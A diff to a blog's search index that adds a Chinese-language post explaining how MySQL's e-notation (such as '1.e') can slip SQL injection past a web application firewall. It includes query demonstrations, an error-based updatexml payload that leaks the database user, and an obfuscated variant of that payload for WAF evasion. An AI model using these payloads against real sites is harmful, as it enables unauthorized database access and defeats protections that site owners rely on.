@@ -388,4 +388,34 @@
         <tag>靶场</tag>
       </tags>
   </entry>
+  <entry>
+    <title>SQL注入Bypass-科学计数法</title>
+    <url>//blogs/sql_Bypass/</url>
+    <content><![CDATA[<h1 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1.前置知识"></a>1.前置知识</h1><p>科学记数法，特别是e记数法，已经集成到包括SQL在内的许多变成语言中，经过测试，e记数法在指定符号前会被忽略</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() 。, | &amp; % * ^ /</span><br></pre></td></tr></table></figure>
+
+<p>比如我们新建一个查询</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username,password from tb_user where id =&#x27;1&#x27;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| zhangsan | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>加入e记数法之后为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username 1.e,password from tb_user where id =&#x27;1&#x27;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| zhangsan | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>且1.e中的数字无关紧要，任何数字都可以位于点和e之间，并且点是必须的（如1561.161e）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username 1561.161e,password from tb_user where id =&#x27;1&#x27;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| zhangsan | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-应用"><a href="#2-应用" class="headerlink" title="2.应用"></a>2.应用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;+and+updatexml(1,concat(0x7e,(user()),0x7e),3)#</span><br></pre></td></tr></table></figure>
+
+<p>这是一个无waf情况的可以爆出数据库用户的payload，在有waf的情况下即会被拦截</p>
+<p><img src="/../images/SQL%E6%B3%A8%E5%85%A5Bypass-%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95/image-20221222172236287.png" alt="image-20221222172236287"></p>
+<p>使用e记数法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;+and+updatexml+1.e(1,concat+1.e(0x7e,(user+1.e()),0x7e),3)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/SQL%E6%B3%A8%E5%85%A5Bypass-%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95/image-20221222172434593.png" alt="image-20221222172434593"></p>
+<h1 id="3-参考"><a href="#3-参考" class="headerlink" title="3.参考"></a>3.参考</h1><p><a href="https://blog.mo60.cn/index.php/archives/788.html">mysql科学计数法之sql注入bypass - JunBlog (mo60.cn)</a></p>
+]]></content>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>Bypass</tag>
+      </tags>
+  </entry>
 </search>
